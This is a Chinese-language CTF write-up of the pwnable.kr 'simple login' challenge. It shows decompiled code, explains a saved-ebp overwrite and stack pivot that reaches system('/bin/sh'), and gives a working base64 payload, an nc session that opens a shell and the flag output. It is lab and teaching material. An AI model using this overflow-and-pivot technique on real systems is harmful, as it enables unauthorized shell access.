---
title: pwnable.kr-simple login
date: 2018-02-25 22:24:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
# 前言
其实是一道很简单的栈溢出题目，但是我在分析代码的时候却浪费了不少时间，主要是没注意linux下`base64`命令在编码时会主动加上换行符`\n`的base64编码，导致逻辑分析错误，教训啊。
# 分析
还是得逆向`login`
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE *v4; // [sp+18h] [bp-28h]@1
  __int16 v5; // [sp+1Eh] [bp-22h]@1
  unsigned int v6; // [sp+3Ch] [bp-4h]@1

  memset(&v5, 0, 0x1Eu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ");
  _isoc99_scanf("%30s", &v5);
  memset(&input, 0, 0xCu);
  v4 = 0;
  v6 = Base64Decode((int)&v5, &v4);
  if ( v6 > 0xC )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, v4, v6);
    if ( auth(v6) == 1 )
      correct();
  }
  return 0;
}
```
```c
_BOOL4 __cdecl auth(int a1)
{
  char v2; // [sp+14h] [bp-14h]@1
  char *s2; // [sp+1Ch] [bp-Ch]@1
  int v4; // [sp+20h] [bp-8h]@1

  memcpy(&v4, &input, a1);
  s2 = (char *)calc_md5((int)&v2, 12);
  printf("hash : %s\n", s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}
```
```c
void __noreturn correct()
{
  if ( input == -559038737 )
  {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }
  exit(0);
}
```
贴上主要函数的反编译代码。主要逻辑是通过`auth`函数的判断可以给你个shell。分析`auth`函数可以知道，正常途径需要md5值跟`f87cd601aa7fedca99018a8be88eda34`相等才能通过判断，但是这个md5值计算的是栈上的数据，这里没有办法控制，而且这个md5值网上也没有破解到明文，所以此路不通。
继续程序逻辑可以发现，输入的字符串会经过`Base64Decode`解码，这个函数和上一题[md5 calculator](http://www.ktstartblog.top/index.php/archives/146/)算法一样，也存在溢出，但是这里由于限制的输入字符串只有30字节，只能从变量`v4`溢出到`v5`，作用不大。接下来程序限制了解码后的明文长度只能小于或等于`0xc`，然后明文会被复制到数据段的`input`变量中，进入`auth`函数内部可以发现这个函数调用`memcpy(&v4, &input, a1);`，然而`v4`实际上只有8个字节大小。如果明文最大12个字节的话，那么存储`ebp`的栈空间就会被覆盖。再看看`main`函数最后有一个`leave`指令，这个指令相当于`mov esp，ebp;pop ebp`，而这个`ebp`就是前面可以控制的栈空间中的`ebp`。那么之后函数返回时就能控制返回地址。
整理下思路：
1. 明文最大长度12字节，最后4字节填入存储执行的地址的地址在减4字节（还有`pop ebp`操作）如`input`地址
2. 明文前4字节填入要执行的地址，如`system('/bin/sh');`反汇编可以看到地址是`0x08049284`

exp如下
```bash
Python 2.7.12 (default, Dec  4 2017, 14:50:18) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> base64.b64encode('\x84\x92\x04\x081234\x3c\xeb\x11\x08')
'hJIECDEyMzQ86xEI'
>>> quit()
```
```bash
root@1:~/桌面/test$ nc pwnable.kr 9003
Authenticate : hJIECDEyMzQ86xEI
hash : 7e562c3d896c061642d4d64162cbf94e
ls
flag
log
simplelogin
super.pl
cat flag
control EBP, control ESP, control EIP, control the world~


```
另外需要注意的是`auth`函数是没有`stack canary`保护的，所以可以放心覆盖。
# 总结
难度不难，但是要注意细节。